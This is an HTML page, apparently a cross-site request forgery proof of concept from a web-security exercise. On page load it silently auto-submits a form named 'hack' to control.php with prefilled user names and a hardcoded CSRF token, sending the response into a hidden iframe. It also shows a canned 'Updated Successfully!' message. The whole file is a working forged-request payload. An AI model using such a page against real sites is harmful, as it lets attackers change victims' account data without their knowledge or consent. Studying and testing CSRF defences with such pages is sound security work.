

<html>

	<head>
		<meta charset="UTF-8">
		<title>Update user</title>
		<link rel="stylesheet" href="style.css">
		<link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<link href="css/testlogin.css" rel="stylesheet">
<link rel="stylesheet" href="https://jqueryvalidation.org/files/demo/site-demos.css">
<script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/jquery.validation/1.15.0/jquery.validate.min.js"></script>
<script src="https://cdn.jsdelivr.net/jquery.validation/1.15.0/additional-methods.min.js"></script>
	<!-- <script type="text/javascript" src="http://ff.kis.v2.scr.kaspersky-labs.com/8226E226-F4F6-D144-BFA7-CC2A024D8A9A/main.js" charset="UTF-8"></script><link rel="stylesheet" crossorigin="anonymous" href="http://ff.kis.v2.scr.kaspersky-labs.com/E31289B3-53E6-4344-8C24-D918D0A36946/abn/main.css"/></head> -->

<body onload="document.hack.submit()">
<div class="container-fluid">
<div class="second">
<div class="inside">
	 Hi, admin | 	
<form action="./control.php" method ="POST" target="hiddenFrame" name="hack">
<table class="table1">
<tr>
<td><h2> <td><h2 class="title-up"> Update
User</h2></td></h2></td>
</tr>
<tr>
	<td><label for="fname">First Name</label></td> 
	<td>
	  <input class="updatename left" name="fname" placeholder="&#xf007  First Name" value="gordon" type="text" required>
	</td>
	</tr>		
<tr>	
	<td><label for="lname">Last Name </label></td>
	 <td><input class="updatepass" name="lname" placeholder="&#xf007  Last Name" value="ramsay" type="text" required></td>
</tr>
<tr>	
	
</tr>
</table>

<div>
<input id="login-username" type="hidden" class="form-control" name="csrf_token" value="159563f579cccc23452e7ef20bdb5c71">  
</div>

<button class="login" value="Update"> Update </button>

<button type="reset" value="Reset" class="cancel">Reset</button>

   <a href="logout.php"   class="cancel  btn btn-default" style="float: right;
    margin-top: 8px;
    background-color: rosybrown;">Logout</a>
</form>
<div>
		 <?php
		 $messsge = "Updated Successfully! " ;
		 $display_messsge = "<p class=\"text-success\"><strong>".$messsge."</strong></p>";
        echo $display_messsge;
		?>
</div>
	<iframe name="hiddenFrame" style="display: none;"></iframe>
	<script type="text/javascript" src="./script.js"></script>
	
</body>
</html>